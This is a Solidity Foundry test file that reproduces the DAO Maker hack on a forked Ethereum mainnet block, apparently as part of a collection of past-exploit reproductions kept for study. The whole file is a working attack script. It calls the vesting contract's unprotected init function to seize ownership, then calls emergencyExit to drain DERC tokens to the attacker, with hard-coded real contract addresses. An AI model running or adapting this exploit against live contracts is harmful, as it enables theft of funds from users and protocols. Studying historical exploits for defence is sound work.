// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {IERC20} from '../../interfaces/IERC20.sol';

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';

interface DAOMaker {
    function init(uint256 _start, uint256[] calldata _releasePeriods, uint256[] calldata _releaseDate, address _token) external;
    function emergencyExit(address receiver) external;
    function owner() external view returns(address);
}

contract Exploit_DAOMaker is TestHarness, TokenBalanceTracker {
    address internal attacker = 0x2708CACE7b42302aF26F1AB896111d87FAEFf92f;
    DAOMaker internal daomaker = DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);

    IERC20 internal derc = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);

    function setUp() external {
        cheat.createSelectFork('mainnet', 13155349);

        addTokenToTracker(address(derc));
    }

    function test_attack() external {
        console.log('------- STEP 0: INITIAL BALANCE -------');
        logBalances(address(this));

        uint256 balanceBefore = derc.balanceOf(address(this));

        console.log('------- STEP 1: INITIALIZATION -------');
        uint256 initBlock = block.number;

        uint256 start = 1640984401;

        uint256[] memory releasePeriods = new uint256[](1);
        releasePeriods[0] = 5702400;

        uint256[] memory releasePercents = new uint256[](1);
        releasePercents[0] = 10000;

        daomaker.init(start, releasePeriods, releasePercents, address(derc));
        console.log(daomaker.owner());
        console.log(address(this));
       
        console.log('Current Block:', initBlock);
        logBalances(address(this));
        console.log('\n');
        assertEq(daomaker.owner(), address(this));
        
        console.log('------- STEP 2: DERC EXIT -------');

        assertEq(daomaker.owner(), address(this));
        daomaker.emergencyExit(address(this));

        uint256 balanceAfter = derc.balanceOf(address(this));
        assertGe(balanceAfter, balanceBefore);
        logBalances(msg.sender);
    }


}
